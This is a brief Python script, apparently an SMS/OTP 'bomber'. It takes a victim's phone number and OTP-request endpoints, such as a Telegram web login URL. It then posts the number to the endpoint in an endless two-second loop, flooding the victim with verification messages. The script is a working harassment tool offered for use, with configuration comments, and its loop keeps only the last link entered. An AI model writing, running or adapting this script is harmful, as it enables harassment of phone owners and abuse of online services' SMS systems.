import requests
import time

n=int(input("Number of the links>> ")) #You can determine the number of the links
number=input("Number>> ") # phone number
c=1
def bomber(url, data):
    while True:
        req=requests.post(url, json=data)
        time.sleep(2) #depends on the speed of the bomber
        print(req)

while c<=n:
    url=input("Enter thr link>> ") #otp links can be sent in this part
    key=input("Enter the key>> ") #define how the operator works exp: cellphone
    value=input("Enter the value>> ")#and define how the operator seeks the country code
    c+=1
data={key: value+number}
bomber(url, data)

#exp: n=1, number=number, url=telegram webK url, key=cellphone, value=+98